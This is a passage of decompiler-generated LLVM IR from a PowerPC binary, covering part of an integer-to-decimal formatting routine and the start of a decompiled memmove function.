  %v0_10012968 = load i32, i32* %r4.global-to-local, align 4
  %v1_10012968 = icmp slt i32 %v0_10012968, 102
  %v3_10012968 = icmp eq i32 %v0_10012968, 102
  store i1 %v1_10012968, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012968, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10012968, label %dec_label_pc_100129f0, label %dec_label_pc_10012970

dec_label_pc_10012970:                            ; preds = %dec_label_pc_10012968
  %v0_10012970 = load i32, i32* %r7.global-to-local, align 4
  %v1_10012970 = icmp slt i32 %v0_10012970, 0
  %v3_10012970 = icmp eq i32 %v0_10012970, 0
  store i1 %v1_10012970, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012970, i1* %cr7_eq.global-to-local, align 1
  store i32 %stack_var_-194.0, i32* %r5.global-to-local, align 4
  store i32 %v0_10012970, i32* %r11.global-to-local, align 4
  store i32 43, i32* %r4.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v0_10012970, -1
  br i1 %tmp80, label %dec_label_pc_1001298c, label %dec_label_pc_10012984

dec_label_pc_10012984:                            ; preds = %dec_label_pc_10012970
  %v1_10012984 = sub i32 0, %v0_10012970
  store i32 %v1_10012984, i32* %r11.global-to-local, align 4
  store i32 45, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1001298c

dec_label_pc_1001298c:                            ; preds = %dec_label_pc_10012970, %dec_label_pc_10012984
  %v0_100129a031 = phi i32 [ %v0_10012970, %dec_label_pc_10012970 ], [ %v1_10012984, %dec_label_pc_10012984 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10012990 = ptrtoint i32* %stack_var_-179 to i32
  store i32 %v2_10012990, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-179, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_100129a0

dec_label_pc_100129a0:                            ; preds = %dec_label_pc_100129a0.backedge, %dec_label_pc_1001298c
  %v2_100129c0 = phi i32 [ %v3_100129c0, %dec_label_pc_100129a0.backedge ], [ %v2_10012990, %dec_label_pc_1001298c ]
  %v0_100129a4 = phi i32 [ %v0_100129a4.pre, %dec_label_pc_100129a0.backedge ], [ 2, %dec_label_pc_1001298c ]
  %v1_100129a0 = phi i32 [ %v1_100129a0.pre, %dec_label_pc_100129a0.backedge ], [ 10, %dec_label_pc_1001298c ]
  %v1_100129b4 = phi i32 [ %v0_100129a0.pre, %dec_label_pc_100129a0.backedge ], [ %v0_100129a031, %dec_label_pc_1001298c ]
  %v2_100129a0 = sdiv i32 %v1_100129b4, %v1_100129a0
  store i32 %v2_100129a0, i32* %r0.global-to-local, align 4
  %v1_100129a4 = add i32 %v0_100129a4, 1
  store i32 %v1_100129a4, i32* %r7.global-to-local, align 4
  %v1_100129a8 = icmp slt i32 %v1_100129a4, 3
  %v3_100129a8 = icmp eq i32 %v1_100129a4, 3
  store i1 %v1_100129a8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100129a8, i1* %cr7_eq.global-to-local, align 1
  %v1_100129b0 = icmp slt i32 %v2_100129a0, 0
  %v2_100129b0 = icmp sgt i32 %v2_100129a0, 0
  %v3_100129b0 = icmp eq i32 %v2_100129a0, 0
  store i1 %v1_100129b0, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_100129b0, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_100129b0, i1* %cr6_eq.global-to-local, align 1
  %tmp81 = mul i32 %v2_100129a0, -10
  store i32 %v2_100129a0, i32* %r11.global-to-local, align 4
  %v2_100129b4 = add i32 %v1_100129b4, 48
  %v1_100129bc = add i32 %v2_100129b4, %tmp81
  store i32 %v1_100129bc, i32* %r9.global-to-local, align 4
  %v1_100129c0 = trunc i32 %v1_100129bc to i8
  %v3_100129c0 = add i32 %v2_100129c0, -1
  %v4_100129c0 = inttoptr i32 %v3_100129c0 to i8*
  store i8 %v1_100129c0, i8* %v4_100129c0, align 1
  store i32 %v3_100129c0, i32* %r10.global-to-local, align 4
  %v0_100129c4 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_100129c4 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_100129c4 = or i1 %v0_100129c4, %v1_100129c4
  br i1 %v2_100129c4, label %dec_label_pc_100129a0.backedge, label %dec_label_pc_100129c8

dec_label_pc_100129a0.backedge:                   ; preds = %dec_label_pc_100129a0, %dec_label_pc_100129c8
  %v0_100129a0.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_100129a0.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_100129a4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_100129a0

dec_label_pc_100129c8:                            ; preds = %dec_label_pc_100129a0
  %v0_100129c8 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_100129c8, label %dec_label_pc_100129cc, label %dec_label_pc_100129a0.backedge

dec_label_pc_100129cc:                            ; preds = %dec_label_pc_100129c8
  %v1_100129cc = add i32 %v2_100129c0, -2
  store i32 %v1_100129cc, i32* %r9.global-to-local, align 4
  store i32 112, i32* %r0.global-to-local, align 4
  %v1_100129d4 = add i32 %v2_100129c0, -3
  store i32 %v1_100129d4, i32* %r11.global-to-local, align 4
  %v0_100129d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_100129d8 = trunc i32 %v0_100129d8 to i8
  %v4_100129d8 = inttoptr i32 %v1_100129cc to i8*
  store i8 %v1_100129d8, i8* %v4_100129d8, align 1
  %v0_100129dc = load i32, i32* %r5.global-to-local, align 4
  %v1_100129dc = trunc i32 %v0_100129dc to i8
  %v2_100129dc = load i32, i32* %r9.global-to-local, align 4
  %v3_100129dc = add i32 %v2_100129dc, -1
  %v4_100129dc = inttoptr i32 %v3_100129dc to i8*
  store i8 %v1_100129dc, i8* %v4_100129dc, align 1
  %v0_100129e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100129e0 = load i32, i32* %r8.global-to-local, align 4
  %v2_100129e0 = inttoptr i32 %v1_100129e0 to i32*
  store i32 %v0_100129e0, i32* %v2_100129e0, align 4
  %v0_100129e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_100129e4 = load i32, i32* %r8.global-to-local, align 4
  %v2_100129e4 = add i32 %v1_100129e4, 4
  %v3_100129e4 = inttoptr i32 %v2_100129e4 to i32*
  store i32 %v0_100129e4, i32* %v3_100129e4, align 4
  %v0_100129e8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100129e8 = load i32, i32* %r8.global-to-local, align 4
  %v2_100129e8 = add i32 %v1_100129e8, 8
  %v3_100129e8 = inttoptr i32 %v2_100129e8 to i32*
  store i32 %v0_100129e8, i32* %v3_100129e8, align 4
  %v0_100129ec = load i32, i32* %r8.global-to-local, align 4
  %v1_100129ec = add i32 %v0_100129ec, 12
  store i32 %v1_100129ec, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100129f0

dec_label_pc_100129f0:                            ; preds = %dec_label_pc_10012968, %dec_label_pc_10012544, %dec_label_pc_100129cc
  %v0_10012a6c = phi i32 [ %v1_100129fc37, %dec_label_pc_10012968 ], [ %v2_10012550, %dec_label_pc_10012544 ], [ %v1_100129ec, %dec_label_pc_100129cc ]
  %v2_100129f0 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_100129f0, i32* %r9.global-to-local, align 4
  %v1_10012a00.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100129f4

dec_label_pc_100129f4:                            ; preds = %dec_label_pc_100129f4, %dec_label_pc_100129f0
  %v1_10012a00 = phi i32 [ %v2_10012a00, %dec_label_pc_100129f4 ], [ %v1_10012a00.pre, %dec_label_pc_100129f0 ]
  %v0_100129f4 = phi i32 [ %v1_100129f8, %dec_label_pc_100129f4 ], [ %v2_100129f0, %dec_label_pc_100129f0 ]
  %v1_100129f4 = inttoptr i32 %v0_100129f4 to i32*
  %v2_100129f4 = load i32, i32* %v1_100129f4, align 4
  store i32 %v2_100129f4, i32* %r0.global-to-local, align 4
  %v1_100129f8 = add i32 %v0_100129f4, 12
  store i32 %v1_100129f8, i32* %r9.global-to-local, align 4
  %v2_100129fc = icmp ult i32 %v1_100129f8, %v0_10012a6c
  %v2_10012a00 = sub i32 %v1_10012a00, %v2_100129f4
  store i32 %v2_10012a00, i32* @r28, align 4
  br i1 %v2_100129fc, label %dec_label_pc_100129f4, label %dec_label_pc_10012a08

dec_label_pc_10012a08:                            ; preds = %dec_label_pc_100129f4
  %v4_100129fc = icmp eq i32 %v1_100129f8, %v0_10012a6c
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100129fc, i1* %cr7_eq.global-to-local, align 1
  %v3_10012a08 = load i8, i8* %stack_var_-200, align 1
  store i32 160, i32* %r10.global-to-local, align 4
  store i32 160, i32* %stack_var_-156, align 4
  store i32 %v0_10012a6c, i32* @r30, align 4
  %tmp85 = icmp sgt i8 %v3_10012a08, 0
  %v1_10012a1c = zext i1 %tmp85 to i32
  store i32 %v1_10012a1c, i32* %r9.global-to-local, align 4
  %v2_10012a20 = ptrtoint i8* %stack_var_-200 to i32
  store i32 %v2_10012a20, i32* %r0.global-to-local, align 4
  %v2_10012a24 = sub i32 %v2_10012a00, %v1_10012a1c
  store i32 %v2_10012a24, i32* %r11.global-to-local, align 4
  %tmp82 = icmp slt i32 %v2_10012a24, 1
  br i1 %tmp82, label %dec_label_pc_10012a90, label %dec_label_pc_10012a34

dec_label_pc_10012a34:                            ; preds = %dec_label_pc_10012a08
  %v3_10012a34 = load i32, i32* %v2_10012470, align 4
  store i32 %v3_10012a34, i32* %r0.global-to-local, align 4
  %v1_10012a38 = and i32 %v3_10012a34, 8
  store i32 %v1_10012a38, i32* %r7.global-to-local, align 4
  %v3_10012a38 = icmp eq i32 %v1_10012a38, 0
  br i1 %v3_10012a38, label %dec_label_pc_10012a5c, label %dec_label_pc_10012a40

dec_label_pc_10012a40:                            ; preds = %dec_label_pc_10012a34
  %v1_10012a44 = add i32 %v0_10012a6c, 12
  store i32 %v1_10012a44, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_1001a59b.676 to i32), i32* %r9.global-to-local, align 4
  %v2_10012a4c = inttoptr i32 %v0_10012a6c to i32*
  store i32 160, i32* %v2_10012a4c, align 4
  %v0_10012a50 = load i32, i32* %r11.global-to-local, align 4
  %v1_10012a50 = load i32, i32* %r8.global-to-local, align 4
  %v2_10012a50 = add i32 %v1_10012a50, 4
  %v3_10012a50 = inttoptr i32 %v2_10012a50 to i32*
  store i32 %v0_10012a50, i32* %v3_10012a50, align 4
  %v0_10012a54 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012a54 = load i32, i32* %r8.global-to-local, align 4
  %v2_10012a54 = add i32 %v1_10012a54, 8
  %v3_10012a54 = inttoptr i32 %v2_10012a54 to i32*
  store i32 %v0_10012a54, i32* %v3_10012a54, align 4
  br label %dec_label_pc_10012a90

dec_label_pc_10012a5c:                            ; preds = %dec_label_pc_10012a34
  %v1_10012a5c = add i32 %tmp, 16
  %v2_10012a5c = inttoptr i32 %v1_10012a5c to i32*
  %v3_10012a5c = load i32, i32* %v2_10012a5c, align 4
  store i32 %v3_10012a5c, i32* %r0.global-to-local, align 4
  %v1_10012a60 = icmp slt i32 %v3_10012a5c, 48
  %v3_10012a60 = icmp eq i32 %v3_10012a5c, 48
  store i1 %v1_10012a60, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012a60, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10012a60, label %dec_label_pc_10012a68, label %dec_label_pc_10012a84

dec_label_pc_10012a68:                            ; preds = %dec_label_pc_10012a5c
  %v3_10012a68 = load i32, i32* %stack_var_-140, align 4
  store i32 %v0_10012a6c, i32* @r30, align 4
  %v2_10012a70 = add i32 %v3_10012a68, %v2_10012a24
  store i32 %v2_10012a70, i32* %r0.global-to-local, align 4
  store i32 %v2_10012a70, i32* %stack_var_-140, align 4
  br label %dec_label_pc_10012a90

dec_label_pc_10012a7c:                            ; preds = %dec_label_pc_10012a98
  store i32 -1, i32* @r29, align 4
  br label %dec_label_pc_10012acc

dec_label_pc_10012a84:                            ; preds = %dec_label_pc_10012a5c
  store i32 %v2_10012a00, i32* %r0.global-to-local, align 4
  store i32 %v0_10012a6c, i32* @r30, align 4
  br label %dec_label_pc_10012a90

dec_label_pc_10012a90:                            ; preds = %dec_label_pc_10012a08, %dec_label_pc_10012a68, %dec_label_pc_10012a40, %dec_label_pc_10012a84
  store i32 0, i32* @r29, align 4
  %v2_10012a94 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_10012a94, i32* @r31, align 4
  br label %dec_label_pc_10012a98

dec_label_pc_10012a98:                            ; preds = %dec_label_pc_10012ac8, %dec_label_pc_10012a90
  %v0_10012aa8 = phi i32 [ %v1_10012ab4, %dec_label_pc_10012ac8 ], [ %v2_10012a94, %dec_label_pc_10012a90 ]
  %v1_10012a98 = inttoptr i32 %v0_10012aa8 to i32*
  %v2_10012a98 = load i32, i32* %v1_10012a98, align 4
  store i32 %v2_10012a98, i32* %r4.global-to-local, align 4
  %v0_10012a9c = load i32, i32* @r27, align 4
  store i32 %v0_10012a9c, i32* %r3.global-to-local, align 4
  %v1_10012aa0 = add i32 %v0_10012aa8, 4
  %v2_10012aa0 = inttoptr i32 %v1_10012aa0 to i32*
  %v3_10012aa0 = load i32, i32* %v2_10012aa0, align 4
  store i32 %v3_10012aa0, i32* %r5.global-to-local, align 4
  %v0_10012aa4 = load i32, i32* @r26, align 4
  store i32 %v0_10012aa4, i32* %ctr.global-to-local, align 4
  %v1_10012aa8 = add i32 %v0_10012aa8, 8
  %v2_10012aa8 = inttoptr i32 %v1_10012aa8 to i32*
  %v3_10012aa8 = load i32, i32* %v2_10012aa8, align 4
  store i32 %v3_10012aa8, i32* %r6.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_10012aa4)
  %v0_10012ab0 = load i32, i32* @r31, align 4
  %v1_10012ab0 = add i32 %v0_10012ab0, 4
  %v2_10012ab0 = inttoptr i32 %v1_10012ab0 to i32*
  %v3_10012ab0 = load i32, i32* %v2_10012ab0, align 4
  store i32 %v3_10012ab0, i32* %r0.global-to-local, align 4
  %v1_10012ab4 = add i32 %v0_10012ab0, 12
  store i32 %v1_10012ab4, i32* @r31, align 4
  %v0_10012ab8 = load i32, i32* @r29, align 4
  %v1_10012ab8 = load i32, i32* %r3.global-to-local, align 4
  %v2_10012ab8 = add i32 %v1_10012ab8, %v0_10012ab8
  store i32 %v2_10012ab8, i32* @r29, align 4
  %v2_10012abc = icmp slt i32 %v1_10012ab8, %v3_10012ab0
  %v4_10012abc = icmp eq i32 %v1_10012ab8, %v3_10012ab0
  store i1 %v2_10012abc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10012abc, i1* %cr7_eq.global-to-local, align 1
  %v1_10012ac0 = load i32, i32* @r30, align 4
  %v2_10012ac0 = icmp ult i32 %v1_10012ab4, %v1_10012ac0
  %v3_10012ac0 = icmp ugt i32 %v1_10012ab4, %v1_10012ac0
  %v4_10012ac0 = icmp eq i32 %v1_10012ab4, %v1_10012ac0
  store i1 %v2_10012ac0, i1* %cr6_lt.global-to-local, align 1
  store i1 %v3_10012ac0, i1* %cr6_gt.global-to-local, align 1
  store i1 %v4_10012ac0, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_10012abc, label %dec_label_pc_10012ac8, label %dec_label_pc_10012a7c

dec_label_pc_10012ac8:                            ; preds = %dec_label_pc_10012a98
  br i1 %v2_10012ac0, label %dec_label_pc_10012a98, label %dec_label_pc_10012acc

dec_label_pc_10012acc:                            ; preds = %dec_label_pc_10012ac8, %dec_label_pc_10012a7c
  %v0_10012ad0 = phi i32 [ -1, %dec_label_pc_10012a7c ], [ %v2_10012ab8, %dec_label_pc_10012ac8 ]
  store i32 %v0_10012420, i32* %r0.global-to-local, align 4
  store i32 %v0_10012ad0, i32* %r3.global-to-local, align 4
  ret i32 %v0_10012ad0

; uselistorder directives
  uselistorder i32 %v0_10012ad0, { 1, 0 }
  uselistorder i32 %v1_10012ab8, { 2, 1, 0 }
  uselistorder i32 %v1_10012ab4, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v3_10012ab0, { 1, 0, 2 }
  uselistorder i32 %v0_10012aa8, { 0, 2, 1 }
  uselistorder i32 %v3_10012a5c, { 1, 0, 2 }
  uselistorder i32 %v1_10012a1c, { 1, 0 }
  uselistorder i32 %v2_10012a00, { 0, 1, 3, 2 }
  uselistorder i32 %v1_100129f8, { 0, 2, 3, 1 }
  uselistorder i32 %v0_100129f4, { 1, 0 }
  uselistorder i32 %v0_10012a6c, { 3, 2, 5, 4, 6, 1, 0 }
  uselistorder i32 %v3_100129c0, { 1, 2, 0 }
  uselistorder i32 %v1_100129a4, { 1, 0, 2 }
  uselistorder i32 %v2_100129a0, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_10012970, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_10012940, { 2, 0, 1 }
  uselistorder i32 %v2_1001293c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_100128ac, { 1, 0 }
  uselistorder i32 %v2_10012810, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_100127e4, { 4, 0, 3, 2, 1 }
  uselistorder i32 %v1_100127ac, { 3, 0, 1, 2 }
  uselistorder i32 %v0_100127a4, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32 %v2_10012770, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v0_10012760, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_10012754, { 1, 0, 2 }
  uselistorder i32 %v1_10012738, { 0, 3, 2, 1 }
  uselistorder i32 %v2_100126f0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_100126e0, { 1, 0, 3, 2 }
  uselistorder i32 %v1_100126c4, { 1, 0 }
  uselistorder i32 %v1_100126a0, { 1, 0 }
  uselistorder i32 %v2_10012680, { 1, 0, 2 }
  uselistorder i32 %v0_10012628, { 1, 0 }
  uselistorder i32 %v1_1001248c, { 1, 0 }
  uselistorder i32 %v0_10012518, { 2, 1, 0 }
  uselistorder i32 %v1_10012460, { 1, 0 }
  uselistorder i32 %v1_10012440, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 1, 0, 2 }
  uselistorder i32* %stack_var_-177, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-200, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 36, 37, 0, 8, 9, 10, 11, 1, 12, 13, 14, 2, 15, 16, 17, 3, 18, 19, 20, 4, 21, 22, 23, 5, 6, 7, 24, 27, 25, 28, 29, 26, 31, 30, 32, 33, 34, 35, 38 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 8, 7, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 4, 7, 5, 8, 6, 11, 9, 10, 12, 13, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 3, 4, 5, 0, 6, 1, 7 }
  uselistorder i32* %r30.global-to-local, { 4, 5, 0, 6, 1, 7, 3, 2, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 8, 9, 10, 14, 17, 15, 18, 16, 19, 20, 21, 22 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 10, 8, 11, 14, 12, 13, 15, 16, 17, 19, 18 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0, 38, 39, 40, 41 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 26, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 29 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 27, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 28, 30, 31 }
  uselistorder i1* %cr6_gt.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 160, { 0, 3, 5, 2, 1, 4 }
  uselistorder i32 45, { 2, 1, 0 }
  uselistorder i32 112, { 3, 4, 0, 1, 5, 2 }
  uselistorder i32 176, { 2, 3, 0, 4, 1 }
  uselistorder i8 48, { 2, 3, 4, 5, 7, 6, 8, 0, 9, 1 }
  uselistorder i32 57, { 2, 3, 4, 0, 1 }
  uselistorder i32 102, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 103, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 -2147483648, { 9, 0, 1, 13, 12, 2, 4, 3, 14, 6, 5, 15, 8, 7, 16, 10, 11 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1001a598.674 to i32), { 2, 0, 1 }
  uselistorder i32 96, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 43, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012a90, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_100129f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100129a0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1001298c, { 1, 0 }
  uselistorder label %dec_label_pc_10012968, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001293c, { 1, 0 }
  uselistorder label %dec_label_pc_10012928, { 1, 0 }
  uselistorder label %dec_label_pc_1001290c, { 1, 0 }
  uselistorder label %dec_label_pc_100128e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100128c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100128a0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10012884, { 1, 0 }
  uselistorder label %dec_label_pc_100127f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012790, { 1, 0 }
  uselistorder label %dec_label_pc_10012750, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10012714, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100126e8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100126c8, { 1, 0 }
  uselistorder label %dec_label_pc_10012654, { 1, 0 }
  uselistorder label %dec_label_pc_10012544, { 1, 0 }
  uselistorder label %dec_label_pc_1001249c, { 1, 0 }
  uselistorder label %dec_label_pc_10012470, { 1, 0 }
  uselistorder label %dec_label_pc_10012464, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_10012ae4 = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v0_10012aec = load i32, i32* @r5, align 4
  store i32 %v0_10012aec, i32* @r11, align 4
  br i1 %v2_10012ae4, label %dec_label_pc_10012af8, label %dec_label_pc_10012af4

dec_label_pc_10012af4:                            ; preds = %entry
  %v0_10012af4 = call i32 @memcpy()
  store i32 %v0_10012af4, i32* @r3, align 4
  %v0_10012af8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10012af8

dec_label_pc_10012af8:                            ; preds = %entry, %dec_label_pc_10012af4
  %v0_10012af8 = phi i32 [ %v0_10012aec, %entry ], [ %v0_10012af8.pre, %dec_label_pc_10012af4 ]
  %v1_10012af8 = call i32 @__asm_rlwinm.(i32 %v0_10012af8, i32 29, i32 3, i32 31)
  store i32 %v1_10012af8, i32* %r9.global-to-local, align 4
  %v4_10012af8 = icmp eq i32 %v1_10012af8, 0
  %v1_10012afc = load i32, i32* @r5, align 4
  %v2_10012afc = add i32 %v1_10012afc, %arg2
  store i32 %v2_10012afc, i32* %r4.global-to-local, align 4
  %v0_10012b00 = load i32, i32* @r3, align 4
  %v2_10012b00 = add i32 %v0_10012b00, %v1_10012afc
  store i32 %v2_10012b00, i32* %r10.global-to-local, align 4
  br i1 %v4_10012af8, label %dec_label_pc_10012b28, label %dec_label_pc_10012b08

dec_label_pc_10012b08:                            ; preds = %dec_label_pc_10012af8
  %v1_10012b08 = urem i32 %v2_10012b00, 4
  %v3_10012b08 = icmp eq i32 %v1_10012b08, 0
  br i1 %v3_10012b08, label %dec_label_pc_10012b10, label %dec_label_pc_10012b5c

dec_label_pc_10012b10:                            ; preds = %dec_label_pc_10012b74.dec_label_pc_10012b10_crit_edge, %dec_label_pc_10012b08
  %v1_10012b1c.pre = phi i32 [ %v1_10012b1c.pre.pre, %dec_label_pc_10012b74.dec_label_pc_10012b10_crit_edge ], [ %v2_10012b00, %dec_label_pc_10012b08 ]
  %v0_10012b10 = phi i32 [ %v1_10012b74, %dec_label_pc_10012b74.dec_label_pc_10012b10_crit_edge ], [ %v1_10012af8, %dec_label_pc_10012b08 ]
  store i32 %v0_10012b10, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10012b14

dec_label_pc_10012b14:                            ; preds = %dec_label_pc_10012b14, %dec_label_pc_10012b10
  %v1_10012b1c = phi i32 [ %v2_10012b20, %dec_label_pc_10012b14 ], [ %v1_10012b1c.pre, %dec_label_pc_10012b10 ]
  %v0_10012b14 = load i32, i32* %r4.global-to-local, align 4
  %v1_10012b14 = add i32 %v0_10012b14, -4
  %v2_10012b14 = inttoptr i32 %v1_10012b14 to i32*
  %v3_10012b14 = load i32, i32* %v2_10012b14, align 4
  %v1_10012b18 = add i32 %v0_10012b14, -8
  %v2_10012b18 = inttoptr i32 %v1_10012b18 to i32*
  %v3_10012b18 = load i32, i32* %v2_10012b18, align 4
  store i32 %v3_10012b18, i32* %r9.global-to-local, align 4
  store i32 %v1_10012b18, i32* %r4.global-to-local, align 4
  %v2_10012b1c = add i32 %v1_10012b1c, -4
  %v3_10012b1c = inttoptr i32 %v2_10012b1c to i32*
  store i32 %v3_10012b14, i32* %v3_10012b1c, align 4
  %v0_10012b20 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012b20 = load i32, i32* %r10.global-to-local, align 4
  %v2_10012b20 = add i32 %v1_10012b20, -8
  %v3_10012b20 = inttoptr i32 %v2_10012b20 to i32*
  store i32 %v0_10012b20, i32* %v3_10012b20, align 4
  store i32 %v2_10012b20, i32* %r10.global-to-local, align 4
  %v0_10012b24 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012b24 = add i32 %v0_10012b24, -1
  store i32 %v1_10012b24, i32* %ctr.global-to-local, align 4
  %v2_10012b24 = icmp eq i32 %v1_10012b24, 0
  br i1 %v2_10012b24, label %dec_label_pc_10012b28, label %dec_label_pc_10012b14

dec_label_pc_10012b28:                            ; preds = %dec_label_pc_10012b14, %dec_label_pc_10012b74, %dec_label_pc_10012af8
  %v0_10012b28 = load i32, i32* @r11, align 4
  %v1_10012b28 = urem i32 %v0_10012b28, 8
  store i32 %v1_10012b28, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_10012b28, 4
  br i1 %tmp, label %dec_label_pc_10012b40, label %dec_label_pc_10012b34

dec_label_pc_10012b34:                            ; preds = %dec_label_pc_10012b28
  %v0_10012b34 = load i32, i32* %r4.global-to-local, align 4
  %v1_10012b34 = add i32 %v0_10012b34, -4
  %v2_10012b34 = inttoptr i32 %v1_10012b34 to i32*
  %v3_10012b34 = load i32, i32* %v2_10012b34, align 4
  store i32 %v1_10012b34, i32* %r4.global-to-local, align 4
  %v1_10012b38 = add nsw i32 %v1_10012b28, -4
  store i32 %v1_10012b38, i32* %r5.global-to-local, align 4
  %v1_10012b3c = load i32, i32* %r10.global-to-local, align 4
  %v2_10012b3c = add i32 %v1_10012b3c, -4
  %v3_10012b3c = inttoptr i32 %v2_10012b3c to i32*
  store i32 %v3_10012b34, i32* %v3_10012b3c, align 4
  store i32 %v2_10012b3c, i32* %r10.global-to-local, align 4
  %v0_10012b40.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10012b40

dec_label_pc_10012b40:                            ; preds = %dec_label_pc_10012b28, %dec_label_pc_10012b34
  %v0_10012b48 = phi i32 [ %v1_10012b28, %dec_label_pc_10012b28 ], [ %v0_10012b40.pre, %dec_label_pc_10012b34 ]
  %v3_10012b40 = icmp eq i32 %v0_10012b48, 0
  br i1 %v3_10012b40, label %dec_label_pc_10012b80, label %dec_label_pc_10012b48

dec_label_pc_10012b48:                            ; preds = %dec_label_pc_10012b40
  store i32 %v0_10012b48, i32* %ctr.global-to-local, align 4
  %v2_10012b50.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10012b4c

dec_label_pc_10012b4c:                            ; preds = %dec_label_pc_10012b4c, %dec_label_pc_10012b48
